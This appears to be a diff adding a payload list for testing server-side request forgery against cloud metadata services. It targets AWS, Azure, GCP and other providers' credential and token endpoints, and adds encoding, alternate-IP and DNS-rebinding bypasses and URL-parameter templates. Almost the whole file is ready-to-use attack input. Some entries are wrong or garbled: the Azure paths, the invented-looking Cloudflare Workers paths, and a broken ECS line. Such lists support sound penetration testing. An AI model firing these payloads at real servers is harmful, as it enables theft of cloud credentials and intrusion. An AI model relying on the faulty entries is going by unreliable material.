@@ -1,0 +1,259 @@
+# Cloud Metadata Service Payloads
+# For testing SSRF vulnerabilities targeting cloud metadata services
+# These endpoints expose instance configuration, IAM credentials, and internal network details
+
+# ============================================================================
+# AWS (Amazon Web Services) - IMDSv1 & IMDSv2
+# ============================================================================
+
+# Base metadata endpoints
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/
+
+# IAM security credentials (CRITICAL - credentials exposure)
+http://169.254.169.254/latest/meta-data/iam/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+
+# Identity credentials
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+
+# Instance identity document
+http://169.254.169.254/latest/dynamic/instance-identity/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/dynamic/instance-identity/pkcs7
+http://169.254.169.254/latest/dynamic/instance-identity/signature
+
+# Instance configuration
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/ami-launch-index
+http://169.254.169.254/latest/meta-data/ami-manifest-path
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/instance-type
+http://169.254.169.254/latest/meta-data/local-hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/public-hostname
+http://169.254.169.254/latest/meta-data/public-ipv4
+
+# Placement and availability zone
+http://169.254.169.254/latest/meta-data/placement/
+http://169.254.169.254/latest/meta-data/placement/availability-zone
+http://169.254.169.254/latest/meta-data/placement/region
+
+# Network information
+http://169.254.169.254/latest/meta-data/network/
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/meta-data/public-keys/
+
+# IMDSv2 token endpoint
+http://169.254.169.254/latest/api/token
+PUT http://169.254.169.254/latest/api/token
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+# SSH keys
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+
+# ============================================================================
+# Azure (Microsoft Azure) - Instance Metadata Service
+# ============================================================================
+
+# Base metadata endpoint
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/?api-version=2021-02-01
+http://169.254.169.254/metadata/v1.json
+
+# Instance information
+http://169.254.169.254/metadata/v1/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/v1/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/v1/instance/network?api-version=2021-02-01
+http://169.254.169.254/metadata/v1/instance/osType?api-version=2021-02-01
+
+# Load balancer metadata
+http://169.254.169.254/metadata/v1/loadbalancer?api-version=2021-02-01
+
+# Managed identity (CRITICAL - token exposure)
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net/&api-version=2018-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?resource=https://storage.azure.com/&api-version=2018-02-01
+
+# Attested data
+http://169.254.169.254/metadata/attested/document?api-version=2020-10-01
+
+# ============================================================================
+# Google Cloud Platform (GCP) - Metadata Service
+# ============================================================================
+
+# Base metadata (requires Metadata-Flavor: Google header)
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/?recursive=true
+
+# Instance metadata
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/instance/name
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+http://metadata.google.internal/computeMetadata/v1/instance/machine-type
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/tags
+
+# Instance attributes (user data)
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
+
+# Project metadata
+http://metadata.google.internal/computeMetadata/v1/project/
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+
+# Service accounts (CRITICAL - token exposure)
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
+
+# ============================================================================
+# DigitalOcean - Metadata Service
+# ============================================================================
+
+# Base metadata
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+
+# Specific metadata fields
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/public-keys
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/vendor-data
+
+# ============================================================================
+# Cloudflare Workers - Environment Metadata
+# ============================================================================
+
+# Worker environment
+/env
+/env_vars
+/secrets
+/workers
+
+# KV storage discovery
+/kv_namespaces
+/durable_objects
+/r2_buckets
+/d1_databases
+
+# ============================================================================
+# IBM Cloud - Metadata Service
+# ============================================================================
+
+http://169.254.169.254/metadata/v1/instance
+http://169.254.169.254/metadata/v1/instance/instanceId
+http://169.254.169.254/metadata/v1/keys
+
+# ============================================================================
+# Oracle Cloud Infrastructure
+# ============================================================================
+
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v1/vcn/
+
+# ============================================================================
+# Aliyun (Alibaba Cloud)
+# ============================================================================
+
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# ============================================================================
+# Tencent Cloud
+# ============================================================================
+
+http://metadata.tencentyun.com/latest/meta-data/
+http://169.254.0.23/latest/meta-data/
+
+# ============================================================================
+# Huawei Cloud
+# ============================================================================
+
+http://169.254.169.254/openstack/latest/meta_data.json
+
+# ============================================================================
+# ENCODING BYPASS TECHNIQUES
+# ============================================================================
+
+# URL encoding
+http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+http%3A%2F%2F169.254.169.254%2Fmetadata%2Fv1%2F
+
+# Double encoding
+http%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252F
+
+# Unicode encoding
+http://169.254.169.254/\u006c\u0061\u0074\u0065\u0073\u0074/\u006d\u0065\u0074\u0061-\u0064\u0061\u0074\u0061/
+
+# IP address variations
+http://0xA9FEA9FE/latest/meta-data/
+http://2852039166/latest/meta-data/
+http://0169.0254.0169.0254/latest/meta-data/
+
+# ============================================================================
+# DNS REBINDING & BYPASS TECHNIQUES
+# ============================================================================
+
+http://169.254.169.254.evil.com/latest/meta-data/
+http://169.254.169.254.nip.io/latest/meta-data/
+http://169.254.169.254.sslip.io/latest/meta-data/
+http://169-254-169-254.mylocal.cloud/latest/meta-data/
+
+# ============================================================================
+# INTERNAL SERVICE DISCOVERY VIA METADATA
+# ============================================================================
+
+# AWS PrivateLink endpoints
+http://169.254.169.254/latest/meta-data/services/
+
+# Kubernetes metadata (if running on EKS/GKE/AKS)
+http://169.254.169.254/latest/meta-data/kubernetes/
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-labels
+
+# ============================================================================
+# CONTAINER METADATA (ECS, EKS, Fargate)
+# ============================================================================
+
+http://169.254.170.2/v2/metadata
+http://169.254.170.2/v2/credentials/
+
+# ECS Task metadata
+http://169.254.170.2/v3/task metadata endpoint
+ECS_CONTAINER_METADATA_URI_V4
+http://169.254.170.2/v4/task
+http://169.254.170.2/v4/task/credentials
+
+# ============================================================================
+# SSRF PAYLOAD TEMPLATES
+# ============================================================================
+
+# Common parameter names for SSRF
+?url=http://169.254.169.254/latest/meta-data/
+&dest=http://169.254.169.254/latest/meta-data/
+&redirect=http://169.254.169.254/latest/meta-data/
+&uri=http://169.254.169.254/latest/meta-data/
+&path=http://169.254.169.254/latest/meta-data/
+&file=http://169.254.169.254/latest/meta-data/
+&feed=http://169.254.169.254/latest/meta-data/
+&fetch=http://169.254.169.254/latest/meta-data/
+&target=http://169.254.169.254/latest/meta-data/
+&link=http://169.254.169.254/latest/meta-data/
+&url=http://metadata.google.internal/computeMetadata/v1/
+&url=http://169.254.169.254/metadata/v1/
+&url=http://169.254.169.254/metadata/v1.json
